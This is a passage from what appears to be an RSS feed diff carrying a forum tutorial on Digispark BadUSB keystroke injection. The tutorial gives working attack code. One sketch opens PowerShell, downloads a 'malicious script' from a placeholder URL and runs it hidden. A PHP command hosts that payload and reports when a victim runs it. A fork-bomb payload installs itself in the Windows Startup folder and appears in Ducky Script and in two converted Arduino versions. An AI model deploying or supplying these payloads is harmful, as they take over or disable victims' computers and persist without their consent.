+    DigiKeyboard.print("powershell");
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.delay(500);
+
+    // now we are on PowerShell, so the code declares a WebClient object to download our malicious script
+    DigiKeyboard.print("$client = new-object System.Net.WebClient");
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.delay(500);
+
+    // downloads the script from "scriptURL" as "script.ps1"
+    DigiKeyboard.print("$client.DownloadFile(\"https://scriptURL\" , \"script.ps1\")");
+    DigiKeyboard.delay(1000);
+
+    // opens a new run.exe instance
+    DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT | KEY_R);
+    DigiKeyboard.delay(750);
+
+    // runs the downloaded script in hidden mode
+    DigiKeyboard.print("powershell.exe -windowstyle hidden -File %USERPROFILE%\\script.ps1");
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+    for (;;)
+    {
+        // empty infinite loop
+    }
+
+}
+</code></pre>
+<p>It’s not too complicated, isn’t it? If you understand the code above you’ll be able to write your own scripts very easily, it’s also worth noticing how the empty loop at the end is optional, you could replace it with a loop like this to make the integrated LED blink once the script has stopped executing:</p>
+<pre><code>while (true)
+{
+    digitalWrite(0, HIGH);
+    delay(300);
+    digitalWrite(0, LOW);
+    delay(300);
+}
+</code></pre>
+<p>And to clear one detail up, yes, in the example above you need a direct link to your script somewhere, if you happen to be in the same LAN as the victim or if you have a VPS or a computer that can be reached over WAN with its own IP then you can use PHP like so:</p>
+<pre><code>mkdir digispark_remote
+mv my_ps_script.ps1 digispark_remote/my_ps_script.ps1
+sudo php -S 0.0.0.0:&lt;port&gt; -t digispark_remote
+</code></pre>
+<p>We use <em>-S 0.0.0.0</em> to enable a server on all network interfaces and we can choose any port we like, also we set the main directory of our temporary server as digispark_remote with the -t parameter. Our console will notify us when someone downloads the script so we’ll know when the script has been executed:</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/e/e99c8caef551cd640590648eb8c7e0327585595d.jpg" alt="0x00sec1" data-base62-sha1="xkCEHsvtuNamZF6jVRFnWMdRdx3" width="690" height="226"><br>
+(old screenshot taken directly from my thesis because I’m too lazy to repeat the whole thing)</p>
+<p>If you fancy any more pre-made scripts to study from or to use straight away CedArctic wrote some very interesting ones and you can find them <a href="https://github.com/CedArctic/DigiSpark-Scripts" rel="noopener nofollow ugc">here</a>.</p>
+<p><strong>4. Can I use Rubber Ducky scripts on my Digispark?</strong></p>
+<p>Not natively, but CedArctic comes to our rescue once again with his beautiful <a href="https://github.com/CedArctic/digiQuack" rel="noopener nofollow ugc">digiQuack</a>, a tool that converts scripts written in Ducky Script into scripts we can load on the Digispark. Alternatively, you can use toxydose’s <a href="https://github.com/toxydose/Duckyspark" rel="noopener nofollow ugc">Duckyspark</a>, which does the same thing, but digiQuack supports foreign keyboard layouts (foreign layouts won’t work with scripts written for the standard US layout!) and optimises the code for the Attiny85 so that it works faster and it doesn’t eats up too much space in EEPROM.</p>
+<p>For example, let’s take the Fork Bomb script we can find in <a href="https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads" rel="noopener nofollow ugc">this great repository of Rubber Ducky payloads</a>:</p>
+<pre><code>CONTROL ESCAPE
+DELAY 200
+STRING cmd
+DELAY 200
+MENU
+DELAY 100
+STRING a
+ENTER
+DELAY 200
+LEFT
+ENTER
+DELAY 1000
+STRING cd %ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup\
+ENTER
+STRING copy con a.bat
+ENTER
+STRING @echo off
+ENTER
+STRING :START
+ENTER
+STRING start a.bat 
+ENTER
+STRING GOTO START
+ENTER
+CONTROL z
+ENTER
+STRING a.bat
+ENTER
+ALT F4
+</code></pre>
+<p>And let’s convert it using both programs: to use Duckyspark we need to type:</p>
+<pre><code>python duckyspark_translator.py ducky_script.txt output_file
+</code></pre>
+<p>output_file will be created as a .ino file and this is the output we get by feeding it the Fork Bomb script:</p>
+<pre><code>//generated by Duckyspark https://github.com/toxydose/Duckyspark
+
+#include "DigiKeyboard.h"
+#define KEY_ESC     41
+#define KEY_BACKSPACE 42
+#define KEY_TAB     43
+#define KEY_PRT_SCR 70
+#define KEY_DELETE  76
+#define KEY_ARROW_RIGHT 0x4F
+#define KEY_ARROW_DOWN  0x51
+#define KEY_ARROW_UP    0x52
+
+void setup()
+{
+
+    DigiKeyboard.delay(5000);
+    DigiKeyboard.sendKeyStroke(0);
+    DigiKeyboard.sendKeyStroke(KEY_ESC,MOD_CONTROL_LEFT | 0);
+    DigiKeyboard.delay(200);
+    DigiKeyboard.print(F("cmd"));
+    DigiKeyboard.delay(200);
+    DigiKeyboard.sendKeyStroke(KEY_F10,MOD_SHIFT_LEFT);
+    DigiKeyboard.delay(100);
+    DigiKeyboard.print(F("a"));
+    DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
+    DigiKeyboard.delay(200);
+    DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT,0);
+    DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
+    DigiKeyboard.delay(1000);
+    DigiKeyboard.print(F("cd %ProgramData%")); DigiKeyboard.print(char(92));                 
+    DigiKeyboard.print(F("Microsoft")); DigiKeyboard.print(char(92)); DigiKeyboard.print(F("Windows")); 
+    DigiKeyboard.print(char(92)); DigiKeyboard.print(F("Start Menu")); DigiKeyboard.print(char(92)); 
+    DigiKeyboard.print(F("Programs")); DigiKeyboard.print(char(92)); DigiKeyboard.print(F("Startup")); 
+    DigiKeyboard.print(char(92)); DigiKeyboard.print(F(""));
+    DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
+    DigiKeyboard.print(F("copy con a.bat"));
+    DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
+    DigiKeyboard.print(F("@echo off"));
+    DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
+    DigiKeyboard.print(F(":START"));
+    DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
+    DigiKeyboard.print(F("start a.bat "));
+    DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
+    DigiKeyboard.print(F("GOTO START"));
+    DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
+    DigiKeyboard.sendKeyStroke(KEY_Z,MOD_CONTROL_LEFT | 0);
+    DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
+    DigiKeyboard.print(F("a.bat"));
+    DigiKeyboard.sendKeyStroke(KEY_ENTER,0);
+    DigiKeyboard.sendKeyStroke(KEY_F4,MOD_ALT_LEFT | 0);
+
+}
+
+
+void loop()
+{
+
+}
+</code></pre>
+<p>We can observe immediately the different approach used by this program: incapsulating the entire payload inside the setup() function to make it execute only once instead of putting it into loop() like we did, in fact, the setup() function in an Arduino sketch contains the very first instructions to be executed by the controller, while loop() is called as soon as setup() finishes its course, and usually contains the actual body of the program, which, as the name suggests, is executed in an infinite loop. We can also see how at some point the program made a little mess when dealing with the string “cd %ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup”, it’s a little odd, but it should still work.</p>
+<p>Our last test is going to be using digiQuack to convert the same payload, we can run digiQuack from our terminal (it has a different version for each OS, written in C++ instead of python) and it will ask us to input the path of our Rubber Ducky payload, then it will ask whether we want the payload to be executed once or in an infinite loop, so we answer just once and the program will create a file called converted.txt in the same folder of the executable, here’s its content:</p>
+<pre><code>DigiKeyboard.sendKeyStroke(0);
+DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT,41);
+DigiKeyboard.delay(200);
+DigiKeyboard.print(F("cmd"));
+DigiKeyboard.delay(200);
+DigiKeyboard.sendKeyStroke(101);
+DigiKeyboard.delay(100);
+DigiKeyboard.print(F("a"));
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(200);
+DigiKeyboard.sendKeyStroke(80);
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(1000);
+DigiKeyboard.print(F("cd %ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup\"));
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.print(F("copy con a.bat"));
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.print(F("@echo off"));
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.print(F(":START"));
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.print(F("start a.bat "));
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.print(F("GOTO START"));
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT,KEY_Z);
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.print(F("a.bat"));
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT,KEY_F4);
+for(;;){ /*empty*/ }
+</code></pre>
+<p>As we can see it’s a more compact and slightly more elegant code, it doesn’t contain any functions so it means we can wrap these lines of code inside either setup() or loop(), it’s our own choice, let’s just remember to include DigiKeyboard.h at the beginning of the file before compiling it.</p>
+<p><strong>5. Conclusions</strong></p>
+<p>And this is all I had to say for today, aside from the fact that if you wish to write scripts for other keyboard layouts you will have to edit the hardcoded numbers contained in DigiKeyboard.h to match the values of your desired layout, you can find the tables you need in <a href="http://www.usb.org/developers/hidpage/Hut1_12v2.pdf" rel="noopener nofollow ugc">this massive document about HID</a>, while <a href="https://github.com/digistump/DigisparkArduinoIntegration/blob/master/libraries/DigisparkKeyboard/DigiKeyboard.h" rel="noopener nofollow ugc">here</a> you can find the source code of said library if you want to take a look at how it works.</p>
+<p>Thank you for reading this far, I’m always available to correct any errors and answer questions if there are any.</p>
+<p>Rubber Ducky scripts: <a href="https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads" rel="noopener nofollow ugc">here</a><br>
+Digispark scripts: <a href="https://github.com/CedArctic/DigiSpark-Scripts" rel="noopener nofollow ugc">here</a></p>
+          <p><a href="https://0x00sec.org/t/a-complete-beginner-friendly-guide-to-the-digispark-badusb/8002/1">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/a-complete-beginner-friendly-guide-to-the-digispark-badusb/8002/1</link>
+        <pubDate>Sun, 12 Aug 2018 23:45:29 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-8002-1</guid>
+        <source url="https://0x00sec.org/t/a-complete-beginner-friendly-guide-to-the-digispark-badusb/8002.rss">A Complete Beginner Friendly Guide To The Digispark BadUSB</source>
+      </item>
+  </channel>
+</rss>
